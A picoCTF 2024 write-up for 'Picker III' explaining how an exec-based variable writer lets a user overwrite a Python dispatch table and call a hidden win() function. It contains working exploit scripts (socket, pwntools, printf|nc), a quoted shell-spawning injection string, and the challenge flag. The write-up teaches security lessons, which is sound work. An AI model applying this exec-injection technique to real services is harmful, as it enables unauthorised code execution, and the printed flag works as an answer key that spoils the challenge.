# Picker III — picoCTF Writeup

**Challenge:** Picker III  
**Category:** Reverse Engineering  
**Difficulty:** Medium  
**Points:** 100  
**Flag:** `picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}`  
**Platform:** picoCTF 2024  
**Writeup by:** zham  

---

## Description

> Can you figure out how this program works to get the flag?
>
> Connect to the program with netcat:
>
> `nc saturn.picoctf.net 50667`
>
> The program's source code can be downloaded here.

## Hints

> 1. Is there any way to modify the function table?

---

## Background Knowledge (Read This First!)

### What is a Function Table / Dispatch Table?

In most languages you can call any function whose name you know. To make a program more locked-down, an author can keep a fixed **table** of allowed function names, and let the user only pick a *slot* in that table (slot 0, 1, 2, 3...). The program then reads the name out of the table and calls it for you. This is sometimes called a *dispatch table* or a *name registry*.

The point of the design is: the user can only run the functions the author pre-registered. They cannot type `win()` and have it executed, because `win` is not in the table.

```
slot 0: print_table
slot 1: read_variable
slot 2: write_variable
slot 3: getRandomNumber      <-- only 4 things callable
```

### The Underlying Assumption

For this "table of allowed names" pattern to actually be secure, **the table itself has to be untouchable from the user side.** If the user can read it, edit it, or replace it, the lock is cosmetic — they can put any function name they want into a slot and then call it through the "safe" path.

This challenge hands the user a `write_variable` primitive that can write to global variables, and one of those globals just happens to be the function table. The hint ("Is there any way to modify the function table?") is the author essentially pointing at the hole.

### How `eval()` and `exec()` Work in Python

- `eval("print(1+1)")` runs a single Python expression and returns the result.
- `exec("x = 1; print(x)")` runs one or more Python statements. No return value.

The challenge uses both:

```python
eval(func_name + '()')      # call the function whose name is in the table slot
exec('global ' + var_name + '; ' + var_name + ' = ' + value)   # set a global
```

The `exec` call is the dangerous one: it builds a Python statement from your input and runs it. As long as the *value* you give it passes the filter (no `;`, `(`, or `)`), the surrounding template `global X; X = <value>` will happily assign anything — including a brand-new function table.

### The Filters, and Why They Do Not Save the Program

Two filters gate user input:

- `filter_var_name` — `^[a-zA-Z_][a-zA-Z_0-9]*$`. The variable *name* must be a plain identifier.
- `filter_value` — must not contain `;`, `(`, or `)`. The *value* cannot be a chained statement or a function call.

These stop the obvious attacks (`exec("import os; os.system('sh')")` is killed by the `;` filter, `eval("win()")` is killed by the parens). But the *name* `func_table` is a perfectly legal Python identifier, and a 128-character string literal made of letters and spaces is a perfectly legal *value*. So we are free to overwrite `func_table` with anything we want, as long as the new string is exactly 128 characters long (4 slots x 32 chars each), otherwise `check_table()` refuses to dispatch anything.

### The Win Function

Right at the bottom of the source there is a function that is conspicuously absent from the table:

```python
def win():
    flag = open('flag.txt', 'r').read()
    flag = flag.strip()
    str_flag = ''
    for c in flag:
        str_flag += str(hex(ord(c))) + ' '
    print(str_flag)
```

It reads `flag.txt`, hex-encodes every character, and prints it. If we can just get `win` to land in any of the four table slots, calling that slot gives us the flag.

---

## Solution — Step by Step

### Step 1 — Read the Source and Find the Locked Door

I opened the source the challenge gave me and looked for anything that touches a function name.

```python
FUNC_TABLE_SIZE = 4
FUNC_TABLE_ENTRY_SIZE = 32
...
func_table = 'print_table                     read_variable                   write_variable                  getRandomNumber                 '
```

So the table is a 128-character string, four 32-character slots. `get_func(n)` reads slot `n`, stopping at the first space, and returns whatever name it found.

```python
def call_func(n):
    ...
    func_name = get_func(n)
    eval(func_name + '()')        # <-- this is the actual call
```

The program never *hard-codes* the function names in the dispatcher. It literally reads them out of the `func_table` string every time. So whatever string `func_table` contains is what will be eval'd.

### Step 2 — Find a Way to Rewrite `func_table`

Scrolling further down I noticed `write_variable`:

```python
def write_variable():
    var_name = input('Please enter variable name to write: ')
    if filter_var_name(var_name):
        value = input('Please enter new value of variable: ')
        if filter_value(value):
            exec('global ' + var_name + '; ' + var_name + ' = ' + value)
```

`func_table` is a module-level global, so `global func_table; func_table = <value>` is a legal pair of statements. `func_table` matches the name regex. And the value only has to be a 128-character string with no `;`, `(`, or `)` — easy.

### Step 3 — Build the Replacement Table

I want slot 3 to be `win` instead of `getRandomNumber`. Each slot is 32 characters, so `win` is followed by 29 spaces:

```
print_table                     read_variable                   write_variable                  win
────────────────────────────────┬────────────────────────────────┬────────────────────────────────┬────────────────────────────────
11 + 21 sp                      13 + 19 sp                      14 + 18 sp                      3 + 29 sp
= 32                            = 32                            = 32                            = 32
```

Total = 128 characters, exactly what `check_table()` wants.

I confirmed the length with a quick Python one-liner:

```
┌──(zham㉿kali)-[~/picoctf/picker-iii]
└─$ python3 -c "
t = ('print_table'      + ' '*21 +
     'read_variable'    + ' '*19 +
     'write_variable'   + ' '*18 +
     'win'              + ' '*29)
print(len(t), repr(t))"
128 'print_table                     read_variable                   write_variable                  win                             '
```

### Step 4 — Write the Exploit

Because `nc` is not installed on this Kali box, I drove the connection from a tiny Python script using the stdlib `socket` module.

```
┌──(zham㉿kali)-[~/picoctf/picker-iii]
└─$ nano exploit.py
```

In `nano` I pasted the script and saved with `Ctrl+O`, `Enter`, `Ctrl+X`:

```python
#!/usr/bin/env python3
"""Picker III exploit - overwrite func_table entry 3 with 'win'."""
import socket, time, sys

HOST = "saturn.picoctf.net"
PORT = 50667

def drain(sock, wait=0.6):
    sock.settimeout(wait)
    buf = b""
    try:
        while True:
            chunk = sock.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.timeout:
        pass
    return buf

def main():
    # Build the replacement table (128 chars, 4 slots of 32).
    new_table = (
        "print_table"      + " " * 21 +
        "read_variable"    + " " * 19 +
        "write_variable"   + " " * 18 +
        "win"              + " " * 29
    )
    assert len(new_table) == 128
    # Wrap as a Python string literal so exec sees a real string.
    value = '"' + new_table + '"'

    s = socket.socket()
    s.connect((HOST, PORT))

    drain(s)                                # banner "==> "

    # Step A: write_variable (option 3) to overwrite func_table
    s.sendall(b"3\n");                drain(s)   # "Please enter variable name to write: "
    s.sendall(b"func_table\n");       drain(s)   # "Please enter new value of variable: "
    s.sendall(value.encode() + b"\n"); drain(s)  # "==> "

    # Step B: print_table (option 1) to confirm slot 3 is now "win"
    s.sendall(b"1\n");                print(drain(s).decode(errors="replace"))

    # Step C: call slot 3, which now runs win()
    s.sendall(b"4\n");                print(drain(s, wait=2.0).decode(errors="replace"))
    s.close()

if __name__ == "__main__":
    main()
```

Save: `Ctrl+O` → `Enter` → `Ctrl+X`.

### Step 5 — Run It

```
┌──(zham㉿kali)-[~/picoctf/picker-iii]
└─$ python3 exploit.py
1: print_table
2: read_variable
3: write_variable
4: win
==> 
0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d 
```

The table now lists `4: win` and option `4` returned the hex-encoded flag.

### Step 6 — Decode the Flag

`win()` prints `hex(ord(c))` for every character. One Python line turns it back into the flag:

```
┌──(zham㉿kali)-[~/picoctf/picker-iii]
└─$ python3 -c "
h = '0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d'
print(''.join(chr(int(x, 16)) for x in h.split()))"
picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}
```

Flag: `picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}`

---

## Alternative — pwntools (One-Shot, Cleaner)

If pwntools is installed, the same exploit fits in fewer lines and reads more cleanly. pwntools is the standard CTF library for this kind of socket work.

```
┌──(zham㉿kali)-[~/picoctf/picker-iii]
└─$ pip install pwntools        # if not already installed
```

`nano exploit_pwn.py`:

```python
#!/usr/bin/env python3
"""Picker III exploit - pwntools version."""
from pwn import remote, context
context.log_level = "error"

HOST, PORT = "saturn.picoctf.net", 50667

new_table = (
    "print_table"      + " " * 21 +
    "read_variable"    + " " * 19 +
    "write_variable"   + " " * 18 +
    "win"              + " " * 29
)
assert len(new_table) == 128
value = '"' + new_table + '"'

io = remote(HOST, PORT)
io.recvuntil(b"==> ")

io.sendline(b"3");        io.recvuntil(b"write: ")
io.sendline(b"func_table"); io.recvuntil(b"variable: ")
io.sendline(value.encode()); io.recvuntil(b"==> ")

io.sendline(b"1");        io.recvuntil(b"==> "); io.recvuntil(b"==> ")
io.sendline(b"4")
print(io.recvuntil(b"==> ").decode(errors="replace"))
```

```
┌──(zham㉿kali)-[~/picoctf/picker-iii]
└─$ python3 exploit_pwn.py
1: print_table
2: read_variable
3: write_variable
4: win

0x70 0x69 0x63 0x6f 0x43 0x54 0x46 0x7b 0x37 0x68 0x31 0x35 0x5f 0x31 0x35 0x5f 0x77 0x68 0x34 0x37 0x5f 0x77 0x33 0x5f 0x67 0x33 0x37 0x5f 0x77 0x31 0x37 0x68 0x5f 0x75 0x35 0x33 0x72 0x35 0x5f 0x31 0x6e 0x5f 0x63 0x68 0x34 0x72 0x67 0x33 0x5f 0x32 0x32 0x36 0x64 0x64 0x32 0x38 0x35 0x7d
```

---

## Alternative — Interactive (Manual, With `nc` on a Normal Box)

If `nc` is available, the attack is a five-line human session. The server only needs two round-trips.

```
┌──(zham㉿kali)-[~/picoctf/picker-iii]
└─$ printf '3\nfunc_table\n"%s"\n1\n4\n' \
   "$(printf 'print_table%.0s'      {1..1})$(printf '%21s' '')$(printf 'read_variable%.0s'    {1..1})$(printf '%19s' '')$(printf 'write_variable%.0s'   {1..1})$(printf '%18s' '')$(printf 'win')$(printf '%29s' '')" \
   | nc saturn.picoctf.net 50667
```

(In a real terminal you would just type the answers after each prompt. The `printf | nc` form is the scriptable equivalent.)

---

## What Happened Internally (Timeline)

1. The wrapper (socat or xinetd) accepted my TCP connection on port 50667 and `exec`ed the Python script. The script ran `reset_table()` and entered the main `while USER_ALIVE:` loop, printing `==> ` as the prompt.
2. I sent `3`. The main loop matched `elif choice == '3':` and called `write_variable()`.
3. The server asked `Please enter variable name to write:`. I sent `func_table`. `filter_var_name("func_table")` returned `True` (legal identifier).
4. The server asked `Please enter new value of variable:`. I sent `"print_table<21 spaces>read_variable<19 spaces>write_variable<18 spaces>win<29 spaces>"`. `filter_value` checked the value for `;`, `(`, `)` — none present, so it passed.
5. The server ran `exec('global func_table; func_table = "..."')`. The `global` declaration made the assignment write to module scope (where the original table lives), then the assignment overwrote the 128-character string with my hand-crafted one. `len(func_table) == 128` still held, so `check_table()` would accept it.
6. I sent `1`. The server called `print_table()` which called `get_func(0..3)`. Slot 3's entry now read up to the first space, which was right after `win`. The slot list became `1: print_table`, `2: read_variable`, `3: write_variable`, `4: win`.
7. I sent `4`. The server called `call_func(3)`. `check_table()` still passed. `get_func(3)` returned the string `win`. The server then ran `eval("win()")`.
8. `win()` opened `flag.txt` on the server's filesystem, read its contents, and printed `hex(ord(c))` for every character. The bytes came back over my socket.
9. I copied the hex blob into a one-liner Python decoder and recovered the flag. The connection stayed open at the next `==> ` prompt; I just closed my client.

The whole attack is a clean example of "the lock is in the wrong layer": the dispatcher treats `func_table` as read-only data, but the language permits any global to be reassigned from a user-controlled `exec` call.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `cat` / text editor | Read the leaked Python source |
| `python3` (REPL one-liners) | Verify the 128-char table length, decode the hex flag |
| `socket` (stdlib) | Talk to the server when `nc` is not installed |
| `pwntools` (`pwn.remote`) | Cleaner alternative for the same exploit |
| `nano` | Write and save the exploit script |
| `nc` (alt) | Quick interactive version on a normal box |
| `printf \| nc` (alt) | Scriptable one-shot version of the manual session |

---

## Key Takeaways

- **A function table is only as safe as the variables backing it.** If the user can write to `func_table`, they can put `win` in any slot. The dispatch layer is a UX choice, not a security boundary.
- **Read the source for sinks, not just sources.** I did not need to bypass `filter_value` in any clever way. The author themselves gave me a `write_variable` function that writes to globals, and one of those globals *is* the function table. That is the bug, and no filter was going to fix it.
- **`eval()` and `exec()` on any user-derived string are almost always a vulnerability.** Even with the `;`, `(`, `)` filter, I had more than enough room to ship a perfectly legal Python string literal as the payload. The lesson is to never assemble code from user input at all — pass data, not code, across trust boundaries.
- **Always search the source for unreferenced helpers.** `win()` was a tell. Whenever a function in a CTF binary is defined but never registered with the dispatcher / menu / handler list, that function is the prize.
- **Length checks are not a security mechanism.** `check_table()` only verified the table was 128 characters long. It did not verify the contents. Treating a length check as if it were a content check is a common rookie mistake.
- **Hex-encoding the flag at print time is just theatre.** The flag was on disk in plaintext; `win()` only cosmetically re-encoded it before printing. A real attacker could just `cat flag.txt` on the server. The encoding only delays the script-kiddie, not the reverser.

### Flag Wordplay Decode

The flag is:

```
picoCTF{7h15_15_wh47_w3_g37_w17h_u53r5_1n_ch4rg3_226dd285}
```

Decoded (leet-speak substitutions: `7`→`t`, `1`→`i`, `5`→`s`, `4`→`a`, `3`→`e`):

- `7h15`            → `this`
- `15`              → `is`
- `wh47`            → `what`
- `w3`              → `we`
- `g37`             → `get`
- `w17h`            → `with`
- `u53r5`           → `users`
- `1n`              → `in`
- `ch4rg3`          → `charge`
- `226dd285`        → hex-looking suffix, likely a per-instance serial

So the phrase is:

> **"this is what we get with users in charge"**

with the trailing `226dd285` being a unique flag-instance tag.

That is a direct jab at the challenge design itself: the author handed the user (the "user in charge") a `write_variable` primitive that could overwrite the function table, and a `win()` function that was deliberately left out of the table. Combined, those two design choices are exactly the vulnerability the challenge is built around. The flag wordplay is the author's self-aware one-liner about the bug they planted.

